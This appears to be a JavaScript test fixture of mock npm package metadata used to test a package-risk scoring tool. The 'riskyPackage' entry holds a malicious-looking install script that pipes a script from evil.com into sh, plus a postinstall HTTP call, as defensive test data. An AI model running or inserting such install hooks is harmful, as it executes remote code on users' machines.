/**
 * Mock package data fixtures for testing
 */

module.exports = {
  // Safe package - high score expected
  safePackage: {
    name: 'safe-package',
    version: '1.0.0',
    description: 'A safe package',
    scripts: {
      test: 'jest',
    },
    dependencies: {
      lodash: '^4.17.21',
    },
    dist: {
      tarball: 'https://registry.npmjs.org/safe-package/-/safe-package-1.0.0.tgz',
    },
    repository: {
      type: 'git',
      url: 'https://github.com/verified/safe-package',
    },
    author: {
      name: 'Verified Publisher',
      email: 'author@example.com',
    },
    _npmUser: {
      name: 'verified-publisher',
    },
    _hasShrinkwrap: false,
    time: {
      created: '2020-01-01T00:00:00.000Z',
      modified: '2023-01-01T00:00:00.000Z',
      '1.0.0': '2020-01-01T00:00:00.000Z',
    },
  },

  // Risky package - low score expected
  riskyPackage: {
    name: 'risky-package',
    version: '1.0.0',
    description: 'A risky package',
    scripts: {
      install: 'curl http://evil.com/script.sh | sh',
      postinstall: "node -e \"require('http').get('http://example.com')\"",
    },
    dependencies: {
      'suspicious-package': '^1.0.0',
    },
    dist: {
      tarball: 'https://registry.npmjs.org/risky-package/-/risky-package-1.0.0.tgz',
    },
    repository: {
      type: 'git',
      url: 'https://github.com/suspicious/risky-package',
    },
    time: {
      created: '2023-12-01T00:00:00.000Z',
      modified: '2023-12-01T00:00:00.000Z',
      '1.0.0': '2023-12-01T00:00:00.000Z',
    },
  },

  // Package with obfuscated code
  obfuscatedPackage: {
    name: 'obfuscated-package',
    version: '1.0.0',
    description: 'Package with obfuscated code',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/obfuscated-package/-/obfuscated-package-1.0.0.tgz',
    },
    files: ['dist/bundle.min.js'], // Large minified file
  },

  // Package with advisory history
  packageWithAdvisories: {
    name: 'vulnerable-package',
    version: '1.0.0',
    description: 'Package with security advisories',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/vulnerable-package/-/vulnerable-package-1.0.0.tgz',
    },
  },

  // Package with update behavior issues
  suspiciousUpdatePackage: {
    name: 'suspicious-update',
    version: '2.0.0',
    description: 'Package with suspicious update behavior',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/suspicious-update/-/suspicious-update-2.0.0.tgz',
    },
    time: {
      created: '2020-01-01T00:00:00.000Z',
      modified: '2023-12-01T00:00:00.000Z',
      '1.0.0': '2020-01-01T00:00:00.000Z',
      '2.0.0': '2023-12-01T00:00:00.000Z',
    },
    // Version 1.0.0 was much smaller
    versions: {
      '1.0.0': {
        dist: {
          unpackedSize: 1024, // 1KB
        },
      },
      '2.0.0': {
        dist: {
          unpackedSize: 10 * 1024 * 1024, // 10MB - huge spike
        },
      },
    },
  },

  // Package with verified publisher
  verifiedPublisherPackage: {
    name: 'verified-package',
    version: '1.0.0',
    description: 'Package from verified publisher',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/verified-package/-/verified-package-1.0.0.tgz',
    },
    publisher: {
      username: 'verified-publisher',
      email: 'publisher@example.com',
    },
    _npmUser: {
      name: 'verified-publisher',
    },
  },

  // Package with signed releases
  signedPackage: {
    name: 'signed-package',
    version: '1.0.0',
    description: 'Package with signed releases',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/signed-package/-/signed-package-1.0.0.tgz',
      signatures: [
        {
          keyid: 'SHA256:abc123',
          sig: 'signature-data',
        },
      ],
    },
  },

  // Package with SBOM
  sbomPackage: {
    name: 'sbom-package',
    version: '1.0.0',
    description: 'Package with SBOM',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/sbom-package/-/sbom-package-1.0.0.tgz',
    },
    files: ['sbom.json', 'package.json'],
  },

  // Package without repository
  noRepoPackage: {
    name: 'no-repo-package',
    version: '1.0.0',
    description: 'Package without repository',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/no-repo-package/-/no-repo-package-1.0.0.tgz',
    },
  },

  // Package with scoped name
  scopedPackage: {
    name: '@scope/package',
    version: '1.0.0',
    description: 'Scoped package',
    scripts: {},
    dependencies: {},
    dist: {
      tarball: 'https://registry.npmjs.org/@scope/package/-/package-1.0.0.tgz',
    },
    repository: {
      type: 'git',
      url: 'https://github.com/scope/package',
    },
  },

  // Package with all versions
  packageWithVersions: {
    name: 'versioned-package',
    'dist-tags': {
      latest: '2.0.0',
    },
    versions: {
      '1.0.0': {
        version: '1.0.0',
        dist: {
          tarball: 'https://registry.npmjs.org/versioned-package/-/versioned-package-1.0.0.tgz',
        },
      },
      '2.0.0': {
        version: '2.0.0',
        dist: {
          tarball: 'https://registry.npmjs.org/versioned-package/-/versioned-package-2.0.0.tgz',
        },
      },
    },
    time: {
      created: '2020-01-01T00:00:00.000Z',
      modified: '2023-01-01T00:00:00.000Z',
      '1.0.0': '2020-01-01T00:00:00.000Z',
      '2.0.0': '2023-01-01T00:00:00.000Z',
    },
  },
};
